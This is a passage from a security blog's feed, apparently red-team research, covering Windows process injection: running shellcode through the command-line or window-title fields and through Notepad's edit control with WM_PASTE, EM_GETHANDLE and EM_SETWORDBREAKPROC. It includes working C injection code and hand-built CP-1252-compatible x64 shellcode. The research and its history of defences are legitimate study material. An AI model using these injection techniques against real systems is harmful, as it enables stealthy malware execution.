style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>si<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>pi<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n     \n    <span style=\"color: #696969;\">// wait for process to initialize</span>\n    <span style=\"color: #696969;\">// if you don't wait, there can be a race condition</span>\n    <span style=\"color: #696969;\">// reading the correct command line from new process  </span>\n    <span style=\"color: #400000;\">WaitForInputIdle</span><span style=\"color: #808030;\">(</span>pi<span style=\"color: #808030;\">.</span>hProcess<span style=\"color: #808030;\">,</span> INFINITE<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// the command to execute is just pasted into the notepad</span>\n    <span style=\"color: #696969;\">// edit control.</span>\n    npw <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">FindWindow</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">Notepad</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    ecw <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">FindWindowEx</span><span style=\"color: #808030;\">(</span>npw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">Edit</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">WM_SETTEXT</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">LPARAM</span><span style=\"color: #808030;\">)</span>cmd<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// get the address of command line in new process</span>\n    <span style=\"color: #696969;\">// which contains our shellcode</span>\n    cmdline <span style=\"color: #808030;\">=</span> get_cmdline<span style=\"color: #808030;\">(</span>pi<span style=\"color: #808030;\">.</span>hProcess<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>len<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// set the address to RWX</span>\n    <span style=\"color: #400000;\">VirtualProtectEx</span><span style=\"color: #808030;\">(</span>pi<span style=\"color: #808030;\">.</span>hProcess<span style=\"color: #808030;\">,</span> cmdline<span style=\"color: #808030;\">,</span> \n      len<span style=\"color: #808030;\">,</span> PAGE_EXECUTE_READWRITE<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>old<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// execute shellcode</span>\n    <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">EM_SETWORDBREAKPROC</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">LPARAM</span><span style=\"color: #808030;\">)</span>cmdline<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">WM_LBUTTONDBLCLK</span><span style=\"color: #808030;\">,</span> MK_LBUTTON<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">LPARAM</span><span style=\"color: #808030;\">)</span><span style=\"color: #008000;\">0x000a000a</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>ecw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">EM_SETWORDBREAKPROC</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">LPARAM</span><span style=\"color: #808030;\">)</span><span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #400000;\">CloseHandle</span><span style=\"color: #808030;\">(</span>pi<span style=\"color: #808030;\">.</span>hThread<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #400000;\">CloseHandle</span><span style=\"color: #808030;\">(</span>pi<span style=\"color: #808030;\">.</span>hProcess<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-31 01:09:02 UTC --></p>\n<h2 id=\"win\">5. Window Title</h2>\n<p>IMHO, this is the best of three because the <var>lpTitle</var> field of <var>STARTUPINFO</var> only applies to console processes. If a GUI like notepad is selected, process explorer doesn&#8217;t show any unusual characters for various properties. Set <var>lpTitle</var> to the shellcode and CreateProcessW will inject. As with the other two methods, obtaining the address can be read via the PEB.</p>\n<pre style=\"color: #000000; background: #ffffff;\">    <span style=\"color: #696969;\">// create a new process using shellcode as window title</span>\n    <span style=\"color: #400000;\">ZeroMemory</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">&amp;</span>si<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>si<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>cb          <span style=\"color: #808030;\">=</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>si<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>dwFlags     <span style=\"color: #808030;\">=</span> STARTF_USESHOWWINDOW<span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>wShowWindow <span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">SW_SHOWDEFAULT</span><span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>lpTitle     <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PWCHAR</span><span style=\"color: #808030;\">)</span>WINEXEC<span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-08-01 11:46:23 UTC --></p>\n<h2 id=\"runtime\">6. Runtime Data</h2>\n<p>Two fields (cbReserved2 and lpReserved2) in the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow\">STARTUPINFO</a> structure are, according to Microsoft, &#8220;Reserved for use by the C Run-time&#8221; and must be NULL or zero prior to calling CreateProcess. The maximum amount of data that can be transferred into a new process is 65,536 bytes, but my experiment with it resulted in the new process failing to execute. The fault was in ucrtbase.dll likely because lpReserved2 didn&#8217;t point to the data it expected.</p>\n<p>While it didn&#8217;t work for me, that&#8217;s not to say it can&#8217;t work with some additional tweaking. <a href=\"https://github.com/odzhan/injection/tree/master/cmdline\">Sources</a></p>"
                }
            ],
            "wfw_commentrss": "https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/feed/",
            "slash_comments": "0",
            "media_thumbnail": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/07/shellcode_cmd.png"
                }
            ],
            "href": "",
            "media_content": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/07/shellcode_cmd.png",
                    "medium": "image"
                },
                {
                    "url": "https://0.gravatar.com/avatar/6505a0ec0ae84dac45856b91b0cc2343?s=96&d=identicon&r=G",
                    "medium": "image"
                },
                {
                    "url": "https://modexp.files.wordpress.com/2020/07/env_var.png",
                    "medium": "image"
                },
                {
                    "url": "https://modexp.files.wordpress.com/2020/07/cmdline.png",
                    "medium": "image"
                }
            ]
        },
        {
            "title": "Windows Process Injection: EM_GETHANDLE, WM_PASTE and EM_SETWORDBREAKPROC",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Windows Process Injection: EM_GETHANDLE, WM_PASTE and EM_SETWORDBREAKPROC"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/"
                }
            ],
            "link": "https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/",
            "comments": "https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/#comments",
            "authors": [
                {
                    "name": "odzhan"
                }
            ],
            "author": "odzhan",
            "author_detail": {
                "name": "odzhan"
            },
            "published": "Tue, 07 Jul 2020 00:30:46 +0000",
            "published_parsed": [
                2020,
                7,
                7,
                0,
                30,
                46,
                1,
                189,
                0
            ],
            "tags": [
                {
                    "term": "assembly",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "injection",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "process injection",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "programming",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "redteam",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "security",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "shellcode",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "windows",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "amd64",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "cp1252",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "x86",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "http://modexp.wordpress.com/?p=4901",
            "guidislink": false,
            "summary": "Introduction Edit Controls Writing CP-1252 Compatible Code Initialization Set RAX to 0 Set RAX to 1 Set RAX to -1 Load and Store Data Two Byte Instructions Prefix Codes Generating Shellcode Injecting and Executing Demonstration Encoding Arbitrary Data Encoding Decoding &#8230; <a href=\"https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Introduction Edit Controls Writing CP-1252 Compatible Code Initialization Set RAX to 0 Set RAX to 1 Set RAX to -1 Load and Store Data Two Byte Instructions Prefix Codes Generating Shellcode Injecting and Executing Demonstration Encoding Arbitrary Data Encoding Decoding &#8230; <a href=\"https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://modexp.wordpress.com/feed/",
                    "value": "<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#intro\">Introduction</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#editctrl\">Edit Controls</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#x86\">Writing CP-1252 Compatible Code</a></li>\n<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#init\">Initialization</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#setzero\">Set RAX to 0</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#setpos\">Set RAX to 1</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#setneg\">Set RAX to -1</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#setdata\">Load and Store Data</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#jcc\">Two Byte Instructions</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#prefix\">Prefix Codes</a></li>\n</ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#generate\">Generating Shellcode</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#inject\">Injecting and Executing</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#demo\">Demonstration</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#advanced\">Encoding Arbitrary Data</a></li>\n<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#encdata\">Encoding</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#decdata\">Decoding</a></li>\n</ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#ack\">Acknowledgements</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#research\">Further Research</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#scrapheap\">Scrapheap</a></li>\n</ol>\n<h2 id=\"intro\">1. Introduction</h2>\n<p><a href=\"https://web.archive.org/web/20060904080018/http://security.tombom.co.uk/shatter.html\">&#8216;Shatter attacks&#8217;</a> use <a href=\"https://docs.microsoft.com/en-us/windows/win32/learnwin32/window-messages\">Window messages</a> for privilege escalation and were first described in August 2002 by <a href=\"https://twitter.com/KristinPaget\">Kristin Paget</a>. Early examples demonstrated using <a href=\"https://docs.microsoft.com/en-us/windows/win32/winmsg/wm-settext\">WM_SETTEXT</a> for injection of code and <a href=\"https://docs.microsoft.com/en-us/windows/win32/winmsg/wm-timer\">WM_TIMER</a> to execute it. While Microsoft attempted to address the problem with <a href=\"https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-071\">a patch</a> in December 2002, <a href=\"https://twitter.com/oliverlavery\">Oliver Lavery</a> later <a href=\"https://web.archive.org/web/20030917194127/http://www.idefense.com/idpapers/Shatter_Redux.pdf\">demonstrated</a> how <a href=\"https://docs.microsoft.com/en-us/windows/win32/controls/em-setwordbreakproc\">EM_SETWORDBREAKPROC</a> can also execute code. Kristin Paget delivered a <a href=\"https://web.archive.org/web/20060830211709/http://security.tombom.co.uk/moreshatter.html\">followup paper</a> and <a href=\"https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-paget.pdf\">presentation</a> in August 2003 describing other messages for code redirection. <a href=\"https://twitter.com/hdmoore\">Brett Moore</a> also published <a href=\"https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-moore/bh-us-04-moore-whitepaper.pdf\">a paper</a> in October 2003 that includes a comprehensive list of all messages that could be used for both injection and redirection.</p>\n<p>Without focusing on the design of Windows itself, Shatter attacks were possible for two reasons: No isolation between processes sharing the same interactive desktop, and for allowing code to run from the stack and heap. Starting with Windows Vista and Server 2008, <a href=\"https://docs.microsoft.com/en-us/previous-versions/aa905330(v=msdn.10)\">User Interface Privilege Isolation (UIPI)</a> solves the first problem by defining a set of UI privilege levels to prevent a low-privileged process sending messages to a high-privileged process. <a href=\"https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention\">Data Execution Prevention (DEP)</a> , which was introduced earlier in Windows XP Service Pack 2, solves the second problem. With both features enabled, Shatter attacks are no longer effective. Although DEP and UIPI block Shatter attacks, they do not prevent using window messages for code injection.</p>\n<p><a href=\"https://twitter.com/ESET\">ESET</a> recently published a paper on the <a href=\"https://www.eset.com/int/about/newsroom/press-releases/research/eset-researchers-reveal-modus-operandi-of-the-elusive-invisimole-group-as-it-targeted-military-and-d-2/\">Invisimole</a> malware, drawing attention to its use of <a href=\"https://docs.microsoft.com/en-us/windows/win32/controls/lvm-setitemposition\">LVM_SETITEMPOSITION</a> and <a href=\"https://docs.microsoft.com/en-us/windows/win32/controls/lvm-getitemposition\">LVM_GETITEMPOSITION</a> for injection and <a href=\"https://docs.microsoft.com/en-us/windows/win32/controls/lvm-sortitems\">LVM_SORTITEMS</a> for execution. Using LVM_SORTITEMS to execute code was first suggested by Kristin Paget at Blackhat 2003 and later rediscovered by <a href=\"http://www.hexacorn.com/blog/2019/04/25/listplanting-yet-another-code-injection-trick/\">Adam</a>. PoC codes were published in <a href=\"https://modexp.wordpress.com/2019/04/25/seven-window-injection-methods/#listplanting\">a previous blog entry here</a>, and by <a href=\"https://twitter.com/theevilbit\">Csaba Fitzl</a> <a href=\"https://github.com/theevilbit/injection/blob/master/ListViewCompare_Injection/ListViewCompare_Injection/ListViewCompare_Injection.cpp\">here</a>.</p>\n<p>For this post, I&#8217;ve written <a href=\"https://github.com/odzhan/injection/blob/master/eminject/poc.c\">a PoC</a> that does the following:</p>\n<ul>\n<li>Use the clipboard and WM_PASTE message to inject code into the notepad process.</li>\n<li>Use the EM_GETHANDLE message and ReadProcessMemory to obtain the buffer address of our code.</li>\n<li>Use VirtualProtectEx to change memory permissions from Read-Write to Read-Write-Execute.</li>\n<li>Use the EM_SETWORDBREAKPROC and WM_LBUTTONDBLCLK to execute shellcode.</p>\n</ul>\n<p>Although VirtualProtectEx is used, it may be possible to run notepad with DEP disabled. It&#8217;s also worth pointing out the shellcode is designed for CP-1252 encoding rather than UTF-8 encoding, so the PoC may not work on every system. The injection method will succeed, but notepad is likely to crash after the conversion to unicode.</p>\n<h2 id=\"editctrl\">2. Edit Controls</h2>\n<p><a href=\"https://twitter.com/Hexacorn\">Adam</a> writes in <a href=\"http://www.hexacorn.com/blog/2019/06/28/talking-to-and-handling-edit-boxes/\">Talking to, and handling (edit) boxes</a> about code injection via <a href=\"https://docs.microsoft.com/en-us/windows/win32/controls/about-edit-controls\">edit controls</a> and using <a href=\"https://docs.microsoft.com/en-us/windows/win32/controls/em-gethandle\">EM_GETHANDLE</a> to obtain the address of where the code is stored. Using notepad as an example, one can open a file containing executable code or use the clipboard and the <a href=\"https://docs.microsoft.com/en-us/windows/win32/dataxchg/wm-paste\">WM_PASTE</a> message to inject into notepad.</p>\n<p>To show where the edit control input is stored in memory, run notepad and type in &#8220;modexp&#8221;. Attach WinDbg and type in the following command: <strong>!address /f:Heap /c:&#8221;s -u %1 %2 \\&#8221;modexp\\&#8221;&#8221;</strong>. This will search heap memory for the Unicode string &#8220;modexp&#8221;. Why Unicode? Since Comctl32.dll version 6, controls only use Unicode. Figure 1 shows the output of this command.</p>\n<p><div class=\"wp-caption alignnone\" id=\"attachment_4928\" style=\"width: 650px;\"><img alt=\"\" class=\"size-full wp-image-4928\" height=\"341\" src=\"https://modexp.files.wordpress.com/2020/07/notepad_windbg_search.png\" width=\"640\" /><p class=\"wp-caption-text\" id=\"caption-attachment-4928\">Figure 1. Searching memory for the string in Notepad.</p></div></p>\n<p>To read the edit control handle, we send EM_GETHANDLE to the window handle. Alternatively, you can use <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowlongptra\">GetWindowLongPtr(0)</a> and <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory\">ReadProcessMemory(ULONG_PTR)</a>, but EM_GETHANDLE will do it in one call. Figure 2 shows the result of executing the following code.</p>\n<pre style=\"color: #000000; background: #ffffff;\">    hw <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">FindWindow</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">Notepad</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    hw <span style=\"color: #808030;\">=</span> <span style=\"color: #400000;\">FindWindowEx</span><span style=\"color: #808030;\">(</span>hw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">Edit</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    emh <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PVOID</span><span style=\"color: #808030;\">)</span><span style=\"color: #400000;\">SendMessage</span><span style=\"color: #808030;\">(</span>hw<span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">EM_GETHANDLE</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span> \n    <span style=\"color: #603000;\">printf</span><span style=\"color: #808030;\">(</span><span style=\"color: #800000;\">\"</span><span style=\"color: #0000e6;\">EM Handle : </span><span style=\"color: #007997;\">%p</span><span style=\"color: #0f69ff;\">\\n</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> emh<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n</pre>\n<p><div class=\"wp-caption alignnone\" id=\"attachment_4929\" style=\"width: 641px;\"><img alt=\"\" class=\"size-full wp-image-4929\" height=\"191\" src=\"https://modexp.files.wordpress.com/2020/07/em_handle_windbg.png\" width=\"631\" /><p class=\"wp-caption-text\" id=\"caption-attachment-4929\">Figure 2. The memory pointer returned by EM_GETHANDLE</p></div></p>\n<p>The handle points to the buffer allocated for input as you can see in Figure 3.</p>\n<p><div class=\"wp-caption alignnone\" id=\"attachment_4931\" style=\"width: 650px;\"><img alt=\"\" class=\"size-full wp-image-4931\" height=\"503\" src=\"https://modexp.files.wordpress.com/2020/07/windbg_memory_buffer_notepad.png\" width=\"640\" /><p class=\"wp-caption-text\" id=\"caption-attachment-4931\">Figure 3. Buffer allocated for input.</p></div></p>\n<p>Since the input is stored in Unicode format, it&#8217;s not possible to just copy any shellcode to the clipboard and paste into the edit control. On my system, notepad converts the clipboard data to Unicode using the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte\">CP_ACP</a> codepage, which is using <a href=\"https://www.cp1252.com/\">Windows-1252 (CP-1252)</a> encoding. CP-1252 is a single byte character set used by default in legacy components of Microsoft Windows for languages derived from the Latin alphabet. When notepad receives the <a href=\"https://docs.microsoft.com/en-us/windows/win32/dataxchg/wm-paste\">WM_PASTE</a> message, it invokes <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboarddata\">GetClipboardData()</a> with <a href=\"https://docs.microsoft.com/en-us/windows/win32/dataxchg/standard-clipboard-formats\">CF_UNICODETEXT</a> as the format. Internally, this invokes GetClipboardCodePage(), which on my system returns CP_ACP, before invoking <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte\">MultiByteToWideChar()</a> converting the text into Unicode format. For CF_TEXT format, ensure the code you copy to the clipboard doesn&#8217;t contain characters in the ranges [0x80, 0x8C], [0x91, 0x9C] or 0x8E, 0x9E and 0x9F. These &#8220;bad characters&#8221; will be converted to double byte character encodings. For UTF-8, only bytes in range [0x00, 0x7F] can be used.</p>\n<p>NOTE: You can paste shellcode as CF_UNICODETEXT and avoid writing complex Ansi shellcode as I have in this post. Just ensure to avoid two consecutive null bytes that indicate string termination. e.g &#8220;\\x00\\x00&#8221;</p>\n<h2 id=\"x86\">3. Writing CP-1252 Compatible Code</h2>\n<p>If writing Ansi shellcode that will be converted to Unicode before execution, let&#8217;s start by looking at x86/x64 instructions that can be used safely after conversion by MultiByteToWideChar() using CP_ACP as the code page.</p>\n<h3 id=\"init\">3.1 Initialization</h3>\n<p>Throughout the code, you&#8217;ll see the following.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 15:03:15 UTC --></p>\n<p>Consider it a NOP instruction because it&#8217;s only intended to insert null bytes between other instructions so that the final assembly code in Ansi is compatible with CP-1252 encoding. Using BP requires three bytes and can be used almost right away.</p>\n<p>Well, that last statement is not entirely true. For 32-Bit mode, creating a stack frame is a normal part of any procedure and authors of older articles on Unicode shellcode rightly presume BP contains the value of the Stack Pointer (SP). Unless BP was unexpectedly overwritten, any write operations with this instruction on 32-Bit systems won&#8217;t cause an exception. However, the same cannot be said for 64-Bit, which depending on the compiler normally avoids using BP to address local variables. For that reason, we must copy SP to BP ourselves before doing anything else. The only instruction between 1-5 bytes I could identify as a solution to this was ENTER. Another thing we do is set AL to 0, so that we&#8217;re not overwriting anything on the stack address RBP contains. The following allocates 256 bytes of memory and copies SP to BP.</p>\n<pre style=\"color: #000000; background: #ffffff;\">    <span style=\"color: #696969;\">; ************************* prolog</span>\n    <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    <span style=\"color: #800000; font-weight: bold;\">enter</span>  <span style=\"color: #008c00;\">256</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #696969;\">; save rbp</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rbp\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">al</span>\n    \n    <span style=\"color: #696969;\">; create local variable for rbp</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   <span style=\"color: #008c00;\">0</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rsp\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">al</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rbp\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-07 14:13:30 UTC --></p>\n<p>If we examine the <a href=\"https://docs.microsoft.com/en-gb/windows/win32/api/winuser/nc-winuser-EDITWORDBREAKPROCA\">EDITWORDBREAKPROCA callback function</a>, we can see <var>lpch</var> is a pointer to the text of the edit control.</p>\n<pre style=\"color: #000000; background: #ffffff;\">EDITWORDBREAKPROCA EDITWORDBREAKPROCA<span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">int</span> EDITWORDBREAKPROCA<span style=\"color: #808030;\">(</span>\n  <span style=\"color: #603000;\">LPSTR</span> lpch<span style=\"color: #808030;\">,</span>\n  <span style=\"color: #800000; font-weight: bold;\">int</span> ichCurrent<span style=\"color: #808030;\">,</span>\n  <span style=\"color: #800000; font-weight: bold;\">int</span> cch<span style=\"color: #808030;\">,</span>\n  <span style=\"color: #800000; font-weight: bold;\">int</span> code\n<span style=\"color: #808030;\">)</span>\n<span style=\"color: #800080;\">{</span><span style=\"color: #808030;\">.</span><span style=\"color: #808030;\">.</span><span style=\"color: #808030;\">.</span><span style=\"color: #800080;\">}</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-07 11:38:05 UTC --></p>\n<p>If you&#8217;re familiar with the Microsoft fastcall convention for x64 mode, you&#8217;ll already know the first four arguments are placed in RCX, RDX, R8 and R9. This callback will load <var>lpch</var> into RCX. This will be useful later.</p>\n<h3 id=\"setzero\">3.2 Set RAX to 0</h3>\n<p>PUSH 0 creates a local variable on the stack and assigns zero to it. The variable is then loaded with POP RAX.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #008c00;\">0</span>                   <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>                 <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 14:33:25 UTC --></p>\n<p>Copy 0xFF00FF00 to EAX. Subtract 0xFF00FF00. It should be noted that these operations will zero out the upper 32-bits of RAX and are insufficient for adding and subtracting with memory addresses.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\xb8\\x00\\xff\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: 